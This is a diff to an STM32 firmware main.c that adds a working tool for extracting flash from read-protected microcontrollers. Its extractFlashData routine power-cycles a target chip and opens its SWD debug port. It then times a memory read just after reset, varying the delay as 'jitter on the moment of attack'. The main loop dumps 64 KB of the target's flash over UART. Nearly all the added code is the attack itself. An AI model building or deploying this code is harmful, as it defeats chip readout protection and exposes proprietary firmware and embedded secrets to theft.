@@ -40,7 +40,9 @@
 #include "stm32l1xx_hal.h"
 
 /* USER CODE BEGIN Includes */
-
+#include "swd.h"
+#include "target.h"
+#include "uart.h"
 /* USER CODE END Includes */
 
 /* Private variables ---------------------------------------------------------*/
@@ -58,10 +60,110 @@ static void MX_USART2_UART_Init(void);
 
 /* USER CODE BEGIN PFP */
 /* Private function prototypes -----------------------------------------------*/
-
+static swdStatus_t extractFlashData( uint32_t const address, uint32_t * const data );
+static extractionStatistics_t extractionStatistics = {0u};
+static uartControl_t uartControl = {0u};
 /* USER CODE END PFP */
 
 /* USER CODE BEGIN 0 */
+/* Reads one 32-bit word from read-protection Flash memory.
+   Address must be 32-bit aligned */
+static swdStatus_t extractFlashData( uint32_t const address, uint32_t * const data )
+{
+  swdStatus_t dbgStatus = swdStatusNone;
+
+  /* Add some jitter on the moment of attack (may increase attack effectiveness) */
+  static uint16_t delayJitter = DELAY_JITTER_MS_MIN;
+
+  uint32_t extractedData = 0u;
+  uint32_t idCode = 0u;
+
+  /* Limit the maximum number of attempts PER WORD */
+  uint32_t numReadAttempts = 0u;
+
+  /* try up to MAX_READ_TRIES times until we have the data */
+  do
+  {
+    HAL_GPIO_WritePin(LED1_GPIO_Port, LED1_Pin, GPIO_PIN_RESET);
+
+    targetSysOn();
+
+    HAL_Delay(5u);
+
+    dbgStatus = swdInit( &idCode );
+
+    if (likely(dbgStatus == swdStatusOk))
+    {
+      dbgStatus = swdEnableDebugIF();
+    }
+
+    if (likely(dbgStatus == swdStatusOk))
+    {
+      dbgStatus = swdSetAP32BitMode( NULL );
+    }
+
+    if (likely(dbgStatus == swdStatusOk))
+    {
+      dbgStatus = swdSelectAHBAP();
+    }
+
+    if (likely(dbgStatus == swdStatusOk))
+    {
+      targetSysUnReset();
+      HAL_Delay(delayJitter);
+
+      /* The magic happens here! */
+      dbgStatus = swdReadAHBAddr( (address & 0xFFFFFFFCu), &extractedData );
+    }
+
+    targetSysReset();
+    ++(extractionStatistics.numAttempts);
+
+    /* Check whether readout was successful. Only if swdStatusOK is returned, extractedData is valid */
+    if (dbgStatus == swdStatusOk)
+    {
+      *data = extractedData;
+      ++(extractionStatistics.numSuccess);
+      HAL_GPIO_WritePin(LED1_GPIO_Port, LED1_Pin, GPIO_PIN_SET);
+    }
+    else
+    {
+      ++(extractionStatistics.numFailure);
+      ++numReadAttempts;
+
+      delayJitter += DELAY_JITTER_MS_INCREMENT;
+      if (delayJitter >= DELAY_JITTER_MS_MAX)
+      {
+        delayJitter = DELAY_JITTER_MS_MIN;
+      }
+    }
+
+    targetSysOff();
+
+    HAL_Delay(1u);
+  }
+  while ((dbgStatus != swdStatusOk) && (numReadAttempts < (MAX_READ_ATTEMPTS)));
+
+  return dbgStatus;
+}
+
+
+void printExtractionStatistics( void )
+{
+  uartSendStr("Statistics: \r\n");
+
+  uartSendStr("Attempts: 0x");
+  uartSendWordHexBE(extractionStatistics.numAttempts);
+  uartSendStr("\r\n");
+
+  uartSendStr("Success: 0x");
+  uartSendWordHexBE(extractionStatistics.numSuccess);
+  uartSendStr("\r\n");
+
+  uartSendStr("Failure: 0x");
+  uartSendWordHexBE(extractionStatistics.numFailure);
+  uartSendStr("\r\n");
+}
 
 /* USER CODE END 0 */
 
@@ -97,12 +199,86 @@ int main(void)
   MX_USART2_UART_Init();
   /* USER CODE BEGIN 2 */
 
+  targetSysCtrlInit();
+
+  uartControl.transmitHex = 0u;
+  uartControl.transmitLittleEndian = 1u;
+  uartControl.readoutAddress = 0x00000000u;
+  uartControl.readoutLen = (64u * 1024u);
+  uartControl.active = 0u;
+
+  uint32_t readoutInd = 0u;
+  uint32_t flashData = 0xFFFFFFFFu;
+  uint32_t btnActive = 0u;
+  uint32_t once = 0u;
+  swdStatus_t status = swdStatusOk;
+
   /* USER CODE END 2 */
 
   /* Infinite loop */
   /* USER CODE BEGIN WHILE */
   while (1)
   {
+    uartReceiveCommands( &uartControl );
+
+    /* Start as soon as the button B1 has been pushed */
+    if (HAL_GPIO_ReadPin(BUTTON1_GPIO_Port, BUTTON1_Pin))
+    {
+      btnActive = 1u;
+    }
+
+    if (uartControl.active || btnActive)
+    {
+      /* reset statistics on extraction start */
+      if (!once)
+      {
+        once = 1u;
+
+        extractionStatistics.numAttempts = 0u;
+        extractionStatistics.numSuccess = 0u;
+        extractionStatistics.numFailure = 0u;
+      }
+
+      status = extractFlashData((uartControl.readoutAddress + readoutInd), &flashData);
+
+      if (status == swdStatusOk)
+      {
+
+        if (!(uartControl.transmitHex))
+        {
+          uartSendWordBin( flashData, &uartControl );
+        }
+        else
+        {
+          uartSendWordHex( flashData, &uartControl );
+          uartSendStr(" ");
+        }
+
+        readoutInd += 4u;
+      }
+      else
+      {
+        if (uartControl.transmitHex)
+        {
+          uartSendStr("\r\n!ExtractionFailure");
+          uartSendWordHexBE( status );
+        }
+      }
+
+      if ((readoutInd >= uartControl.readoutLen) || (status != swdStatusOk))
+      {
+        btnActive = 0u;
+        uartControl.active = 0u;
+        readoutInd = 0u;
+        once = 0u;
+
+        /* Print EOF in HEX mode */
+        if (uartControl.transmitHex != 0u)
+        {
+          uartSendStr("\r\n");
+        }
+      }
+    }
 
   /* USER CODE END WHILE */
 
@@ -207,14 +383,26 @@ static void MX_GPIO_Init(void)
   __HAL_RCC_GPIOB_CLK_ENABLE();
   __HAL_RCC_GPIOD_CLK_ENABLE();
 
-  /*Configure GPIO pins : PC13 PC14 PC15 PC0 
-                           PC1 PC2 PC3 PC4 
-                           PC5 PC6 PC7 PC8 
-                           PC9 PC10 PC11 PC12 */
-  GPIO_InitStruct.Pin = GPIO_PIN_13|GPIO_PIN_14|GPIO_PIN_15|GPIO_PIN_0 
-                          |GPIO_PIN_1|GPIO_PIN_2|GPIO_PIN_3|GPIO_PIN_4 
-                          |GPIO_PIN_5|GPIO_PIN_6|GPIO_PIN_7|GPIO_PIN_8 
-                          |GPIO_PIN_9|GPIO_PIN_10|GPIO_PIN_11|GPIO_PIN_12;
+  /*Configure GPIO pin Output Level */
+  HAL_GPIO_WritePin(GPIOA, LED1_Pin|TARGET_RESET_Pin|TARGET_PWR_Pin|SWDIO_Pin, GPIO_PIN_RESET);
+
+  /*Configure GPIO pin Output Level */
+  HAL_GPIO_WritePin(SWCLK_GPIO_Port, SWCLK_Pin, GPIO_PIN_RESET);
+
+  /*Configure GPIO pin : BUTTON1_Pin */
+  GPIO_InitStruct.Pin = BUTTON1_Pin;
+  GPIO_InitStruct.Mode = GPIO_MODE_INPUT;
+  GPIO_InitStruct.Pull = GPIO_NOPULL;
+  HAL_GPIO_Init(BUTTON1_GPIO_Port, &GPIO_InitStruct);
+
+  /*Configure GPIO pins : PC14 PC15 PC0 PC1 
+                           PC2 PC3 PC4 PC5 
+                           PC6 PC7 PC8 PC9 
+                           PC10 PC11 PC12 */
+  GPIO_InitStruct.Pin = GPIO_PIN_14|GPIO_PIN_15|GPIO_PIN_0|GPIO_PIN_1 
+                          |GPIO_PIN_2|GPIO_PIN_3|GPIO_PIN_4|GPIO_PIN_5 
+                          |GPIO_PIN_6|GPIO_PIN_7|GPIO_PIN_8|GPIO_PIN_9 
+                          |GPIO_PIN_10|GPIO_PIN_11|GPIO_PIN_12;
   GPIO_InitStruct.Mode = GPIO_MODE_ANALOG;
   GPIO_InitStruct.Pull = GPIO_NOPULL;
   HAL_GPIO_Init(GPIOC, &GPIO_InitStruct);
@@ -225,35 +413,54 @@ static void MX_GPIO_Init(void)
   GPIO_InitStruct.Pull = GPIO_NOPULL;
   HAL_GPIO_Init(GPIOH, &GPIO_InitStruct);
 
-  /*Configure GPIO pins : PA0 PA1 PA4 PA5 
-                           PA6 PA7 PA8 PA9 
-                           PA10 PA11 PA12 PA13 
+  /*Configure GPIO pins : PA0 PA1 PA4 PA6 
+                           PA7 PA11 PA12 PA13 
                            PA14 PA15 */
-  GPIO_InitStruct.Pin = GPIO_PIN_0|GPIO_PIN_1|GPIO_PIN_4|GPIO_PIN_5 
-                          |GPIO_PIN_6|GPIO_PIN_7|GPIO_PIN_8|GPIO_PIN_9 
-                          |GPIO_PIN_10|GPIO_PIN_11|GPIO_PIN_12|GPIO_PIN_13 
+  GPIO_InitStruct.Pin = GPIO_PIN_0|GPIO_PIN_1|GPIO_PIN_4|GPIO_PIN_6 
+                          |GPIO_PIN_7|GPIO_PIN_11|GPIO_PIN_12|GPIO_PIN_13 
                           |GPIO_PIN_14|GPIO_PIN_15;
   GPIO_InitStruct.Mode = GPIO_MODE_ANALOG;
   GPIO_InitStruct.Pull = GPIO_NOPULL;
   HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);
 
+  /*Configure GPIO pin : LED1_Pin */
+  GPIO_InitStruct.Pin = LED1_Pin;
+  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
+  GPIO_InitStruct.Pull = GPIO_NOPULL;
+  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
+  HAL_GPIO_Init(LED1_GPIO_Port, &GPIO_InitStruct);
+
   /*Configure GPIO pins : PB0 PB1 PB2 PB10 
                            PB11 PB12 PB13 PB14 
-                           PB15 PB3 PB4 PB5 
-                           PB6 PB7 PB8 PB9 */
+                           PB15 PB3 PB4 PB6 
+                           PB7 PB8 PB9 */
   GPIO_InitStruct.Pin = GPIO_PIN_0|GPIO_PIN_1|GPIO_PIN_2|GPIO_PIN_10 
                           |GPIO_PIN_11|GPIO_PIN_12|GPIO_PIN_13|GPIO_PIN_14 
-                          |GPIO_PIN_15|GPIO_PIN_3|GPIO_PIN_4|GPIO_PIN_5 
-                          |GPIO_PIN_6|GPIO_PIN_7|GPIO_PIN_8|GPIO_PIN_9;
+                          |GPIO_PIN_15|GPIO_PIN_3|GPIO_PIN_4|GPIO_PIN_6 
+                          |GPIO_PIN_7|GPIO_PIN_8|GPIO_PIN_9;
   GPIO_InitStruct.Mode = GPIO_MODE_ANALOG;
   GPIO_InitStruct.Pull = GPIO_NOPULL;
   HAL_GPIO_Init(GPIOB, &GPIO_InitStruct);
+
+  /*Configure GPIO pins : TARGET_RESET_Pin TARGET_PWR_Pin SWDIO_Pin */
+  GPIO_InitStruct.Pin = TARGET_RESET_Pin|TARGET_PWR_Pin|SWDIO_Pin;
+  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
+  GPIO_InitStruct.Pull = GPIO_NOPULL;
+  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
+  HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);
 
   /*Configure GPIO pin : PD2 */
   GPIO_InitStruct.Pin = GPIO_PIN_2;
   GPIO_InitStruct.Mode = GPIO_MODE_ANALOG;
   GPIO_InitStruct.Pull = GPIO_NOPULL;
   HAL_GPIO_Init(GPIOD, &GPIO_InitStruct);
+
+  /*Configure GPIO pin : SWCLK_Pin */
+  GPIO_InitStruct.Pin = SWCLK_Pin;
+  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
+  GPIO_InitStruct.Pull = GPIO_NOPULL;
+  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
+  HAL_GPIO_Init(SWCLK_GPIO_Port, &GPIO_InitStruct);
 
 }
 
